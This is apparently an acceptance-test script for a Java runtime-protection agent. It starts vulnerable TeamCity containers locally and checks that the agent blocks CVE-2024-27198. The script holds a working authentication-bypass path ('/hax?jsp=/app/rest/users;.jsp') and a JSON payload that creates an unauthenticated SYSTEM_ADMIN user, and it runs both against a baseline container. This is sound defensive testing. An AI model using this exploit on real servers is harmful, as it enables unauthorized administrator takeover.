#!/usr/bin/env bash
set -euo pipefail

cd "$(dirname "$0")/.."

docker run --rm -v "$(pwd):/workspace" -w /workspace gradle:jdk25 \
  gradle --no-daemon :agent-java17:agentJava17Jar

image="${OHMYRASP_VULHUB_TEAMCITY_27198_IMAGE:-vulhub/teamcity:2023.11.3}"
baseline_name="${OHMYRASP_VULHUB_TEAMCITY_27198_BASELINE_NAME:-ohmyrasp-vulhub-teamcity-27198-baseline}"
protected_name="${OHMYRASP_VULHUB_TEAMCITY_27198_PROTECTED_NAME:-ohmyrasp-vulhub-teamcity-27198-protected}"
baseline_port="${OHMYRASP_VULHUB_TEAMCITY_27198_BASELINE_PORT:-19198}"
protected_port="${OHMYRASP_VULHUB_TEAMCITY_27198_PROTECTED_PORT:-19199}"
host_agent_jar="$(pwd)/agent-java17/build/libs/ohmyrasp-agent-java17.jar"
baseline_dir="logs/vulhub-teamcity-2024-27198-java17-baseline"
protected_dir="logs/vulhub-teamcity-2024-27198-java17-protected"
payload_dir="logs/vulhub-teamcity-2024-27198-java17-payload"
protected_log="${protected_dir}/events.jsonl"
token_suffix="${OHMYRASP_VULHUB_TEAMCITY_27198_TOKEN_SUFFIX:-$(date +%s)$$}"
baseline_user="ohmyrasp27198_${token_suffix}"
protected_user="ohmyrasp27198_block_${token_suffix}"
exploit_path="/hax?jsp=/app/rest/users;.jsp"
teamcity_opts="-Dteamcity.startup.maintenance=false -Dteamcity.firstStart.setupAdmin.enabled=false"

copy_artifacts() {
  local name="$1"
  local dir="$2"
  mkdir -p "$dir"
  if docker inspect "$name" >/dev/null 2>&1; then
    docker logs "$name" > "${dir}/container.log" 2>&1 || true
  fi
}

cleanup() {
  copy_artifacts "$baseline_name" "$baseline_dir"
  copy_artifacts "$protected_name" "$protected_dir"
  docker rm -f -v "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
}
trap cleanup EXIT

curl_status() {
  local output="$1"
  shift
  local status
  status="$(curl --max-time 30 -sS -o "$output" -w "%{http_code}" "$@" 2>"${output}.err" || true)"
  if [[ -z "$status" ]]; then
    status="000"
  fi
  printf "%s" "$status"
}

wait_for_teamcity() {
  local name="$1"
  local port="$2"
  local dir="$3"
  local status
  for attempt in $(seq 1 180); do
    status="$(curl_status "${dir}/ready-${attempt}.response" "http://127.0.0.1:${port}/login.html")"
    printf 'ready_attempt=%s status=%s\n' "$attempt" "$status" >> "${dir}/attempts.log"
    if [[ "$status" == "200" ]]; then
      return
    fi
    if ! docker ps --filter "name=${name}" --filter status=running --format '{{.Names}}' \
      | grep -Fq "$name"; then
      docker logs "$name" >&2 || true
      echo "TeamCity CVE-2024-27198 container ${name} stopped before readiness" >&2
      exit 1
    fi
    sleep 2
  done
  docker logs "$name" >&2 || true
  echo "TeamCity CVE-2024-27198 did not become ready at ${port}" >&2
  exit 1
}

verify_image_java17_lts() {
  docker run --rm "$image" java -version > "${payload_dir}/image-java-version.txt" 2>&1 || true
  if ! grep -Eq 'version "17\.' "${payload_dir}/image-java-version.txt" \
    || ! grep -Fq 'LTS' "${payload_dir}/image-java-version.txt"; then
    cat "${payload_dir}/image-java-version.txt" >&2 || true
    echo "TeamCity CVE-2024-27198 image did not report a Java 17 LTS runtime" >&2
    exit 1
  fi
}

write_user_payload() {
  local username="$1"
  local output="$2"
  printf \
    '{"username":"%s","password":"%s","email":"%s@example.test","roles":{"role":[{"roleId":"SYSTEM_ADMIN","scope":"g"}]}}' \
    "$username" "$username" "$username" > "$output"
}

detection_count() {
  grep -Fc '"event":"ohmyrasp-detection"' "$protected_log" 2>/dev/null || true
}

internal_forward_block_count() {
  grep -Ec '"algorithm":"java17_request_internal_forward".*"action":"block"' \
    "$protected_log" 2>/dev/null || true
}

wait_for_protected_startup() {
  for attempt in $(seq 1 120); do
    if grep -Fq '"event":"ohmyrasp-java17-agent-start"' "$protected_log" \
      && grep -Fq '"request_hook":"installed"' "$protected_log"; then
      printf 'agent_start_attempt=%s\n' "$attempt" >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  echo "missing Java 17 startup/request-hook marker for protected TeamCity" >&2
  exit 1
}

wait_for_internal_forward_block() {
  local previous="$1"
  local count
  for attempt in $(seq 1 30); do
    count="$(internal_forward_block_count)"
    if (( count > previous )); then
      printf 'internal_forward_block_attempt=%s count=%s\n' "$attempt" "$count" \
        >> "${protected_dir}/attempts.log"
      return
    fi
    sleep 1
  done
  cat "$protected_log" >&2 || true
  echo "missing java17_request_internal_forward block event for TeamCity CVE-2024-27198" >&2
  exit 1
}

run_baseline() {
  local status
  docker run -d --name "$baseline_name" \
    -p "${baseline_port}:8111" \
    -e "TEAMCITY_SERVER_OPTS=${teamcity_opts}" \
    "$image" >/dev/null

  wait_for_teamcity "$baseline_name" "$baseline_port" "$baseline_dir"

  status="$(curl_status "${baseline_dir}/users.response" \
    "http://127.0.0.1:${baseline_port}${exploit_path}")"
  if [[ "$status" != "200" ]] \
    || ! grep -Fq '<users count=' "${baseline_dir}/users.response" \
    || ! grep -Fq 'username="admin"' "${baseline_dir}/users.response"; then
    cat "${baseline_dir}/users.response" >&2 || true
    echo "baseline TeamCity CVE-2024-27198 did not expose unauthenticated users XML" >&2
    exit 1
  fi

  status="$(curl_status "${baseline_dir}/create-admin.response" \
    -H "Content-Type: application/json" \
    --data-binary "@${payload_dir}/baseline-user.json" \
    "http://127.0.0.1:${baseline_port}${exploit_path}")"
  if [[ "$status" != "200" && "$status" != "201" ]] \
    || ! grep -Fq "username=\"${baseline_user}\"" "${baseline_dir}/create-admin.response" \
    || ! grep -Fq 'roleId="SYSTEM_ADMIN"' "${baseline_dir}/create-admin.response"; then
    cat "${baseline_dir}/create-admin.response" >&2 || true
    echo "baseline TeamCity CVE-2024-27198 did not create an unauthenticated SYSTEM_ADMIN user" >&2
    exit 1
  fi
}

run_protected() {
  local status
  local before
  docker run -d --name "$protected_name" \
    -p "${protected_port}:8111" \
    -e "TEAMCITY_SERVER_OPTS=${teamcity_opts}" \
    -e "JAVA_TOOL_OPTIONS=-javaagent:/opt/ohmyrasp/ohmyrasp-agent-java17.jar -Dohmyrasp.java17.log=/opt/ohmyrasp/logs/events.jsonl -Dohmyrasp.java17.block=true" \
    -v "${host_agent_jar}:/opt/ohmyrasp/ohmyrasp-agent-java17.jar:ro" \
    -v "$(pwd)/${protected_dir}:/opt/ohmyrasp/logs" \
    "$image" >/dev/null

  wait_for_teamcity "$protected_name" "$protected_port" "$protected_dir"
  wait_for_protected_startup
  if (( $(detection_count) != 0 )); then
    cat "$protected_log" >&2 || true
    echo "protected TeamCity CVE-2024-27198 emitted detections before exploit traffic" >&2
    exit 1
  fi

  status="$(curl_status "${protected_dir}/safe-login.response" \
    "http://127.0.0.1:${protected_port}/login.html")"
  if [[ "$status" != "200" ]] || (( $(detection_count) != 0 )); then
    cat "$protected_log" >&2 || true
    echo "protected TeamCity safe login request was not quiet" >&2
    exit 1
  fi

  before="$(internal_forward_block_count)"
  status="$(curl_status "${protected_dir}/users-blocked.response" \
    "http://127.0.0.1:${protected_port}${exploit_path}")"
  if [[ "$status" == "200" ]] && grep -Fq '<users count=' "${protected_dir}/users-blocked.response"; then
    cat "${protected_dir}/users-blocked.response" >&2 || true
    echo "protected TeamCity CVE-2024-27198 still exposed unauthenticated users XML" >&2
    exit 1
  fi
  wait_for_internal_forward_block "$before"

  before="$(internal_forward_block_count)"
  status="$(curl_status "${protected_dir}/create-admin-blocked.response" \
    -H "Content-Type: application/json" \
    --data-binary "@${payload_dir}/protected-user.json" \
    "http://127.0.0.1:${protected_port}${exploit_path}")"
  if [[ "$status" == "200" || "$status" == "201" ]]; then
    cat "${protected_dir}/create-admin-blocked.response" >&2 || true
    echo "protected TeamCity CVE-2024-27198 still accepted unauthenticated admin creation" >&2
    exit 1
  fi
  wait_for_internal_forward_block "$before"
}

mkdir -p "$baseline_dir" "$protected_dir" "$payload_dir"
rm -f "${protected_log}" "${baseline_dir}"/*.response "${protected_dir}"/*.response
docker rm -f -v "$baseline_name" "$protected_name" >/dev/null 2>&1 || true
write_user_payload "$baseline_user" "${payload_dir}/baseline-user.json"
write_user_payload "$protected_user" "${payload_dir}/protected-user.json"
verify_image_java17_lts
run_baseline
run_protected

echo "Vulhub TeamCity CVE-2024-27198 Java 17 acceptance passed"
